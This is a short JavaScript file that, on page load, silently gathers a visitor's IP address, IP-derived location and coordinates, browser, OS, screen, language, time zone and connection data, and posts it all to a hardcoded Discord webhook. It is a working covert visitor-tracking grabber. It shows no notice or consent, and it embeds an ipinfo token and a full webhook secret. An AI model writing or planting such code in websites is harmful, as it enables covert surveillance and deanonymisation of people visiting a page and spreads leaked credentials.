 // Function to gather all available user information using IP info for location
 function gatherUserInfo() {
    let userInfo = {};

    // Get IP Information (from ipinfo.io)
    fetch('https://ipinfo.io/json?token=99f73457c30e33')
        .then(response => response.json())
        .then(ipData => {
            // Collect IP-based location and other details from ipinfo.io
            userInfo.ip = ipData.ip;
            userInfo.location = `${ipData.city}, ${ipData.region}, ${ipData.country}`;
            userInfo.geo = ipData.loc; // Latitude and Longitude (from IP)

            // Get Browser and OS info
            userInfo.browser = getBrowserInfo();

            // Get screen information
            userInfo.screen = {
                width: window.screen.width,
                height: window.screen.height,
                colorDepth: window.screen.colorDepth,
                pixelRatio: window.devicePixelRatio
            };

            // Get user's language
            userInfo.language = navigator.language || navigator.userLanguage;

            // Get Time Zone
            userInfo.timeZone = Intl.DateTimeFormat().resolvedOptions().timeZone;

            // Get connection info (if available)
            if (navigator.connection) {
                userInfo.connection = {
                    type: navigator.connection.effectiveType || 'Unknown',
                    downlink: navigator.connection.downlink || 'Unknown',
                    rtt: navigator.connection.rtt || 'Unknown'
                };
            } else {
                userInfo.connection = "Connection info not available";
            }

            // Send all collected data to Discord
            sendToDiscord(userInfo);
        })
        .catch(error => {
            console.error('Error fetching IP information:', error);
        });
}

// Function to detect browser and operating system
function getBrowserInfo() {
    const userAgent = navigator.userAgent;
    let browserName = 'Unknown';
    let os = 'Unknown';

    // Browser detection
    if (userAgent.indexOf('Chrome') > -1) {
        browserName = 'Google Chrome';
    } else if (userAgent.indexOf('Safari') > -1) {
        browserName = 'Safari';
    } else if (userAgent.indexOf('Firefox') > -1) {
        browserName = 'Mozilla Firefox';
    } else if (userAgent.indexOf('MSIE') > -1 || userAgent.indexOf('Trident/') > -1) {
        browserName = 'Internet Explorer';
    }

    // OS detection
    if (userAgent.indexOf('Win') > -1) {
        os = 'Windows';
    } else if (userAgent.indexOf('Mac') > -1) {
        os = 'macOS';
    } else if (userAgent.indexOf('Linux') > -1) {
        os = 'Linux';
    } else if (userAgent.indexOf('Android') > -1) {
        os = 'Android';
    } else if (userAgent.indexOf('like Mac') > -1) {
        os = 'iOS';
    }

    return { browserName, os };
}

// Function to send user info to Discord webhook
function sendToDiscord(userInfo) {
    const webhookURL = 'https://discord.com/api/webhooks/1250303725835128956/hb3e4hj76bdTHUul_8q1rPMpY-C_I8wm_BIRUdjMttdhyGclXNbNbKnp2Pjztvy_mTwK'; // Your webhook URL
    const payload = {
        content: `User Info: ${JSON.stringify(userInfo, null, 2)}`
    };

    fetch(webhookURL, {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json'
        },
        body: JSON.stringify(payload)
    })
    .then(response => {
        if (!response.ok) {
            throw new Error('Error sending message to Discord');
        }
        console.log('User info sent to Discord successfully');
    })
    .catch(error => {
        console.error('Error sending user info to Discord:', error);
    });
}

// Fetch user info when the page loads
window.onload = gatherUserInfo;
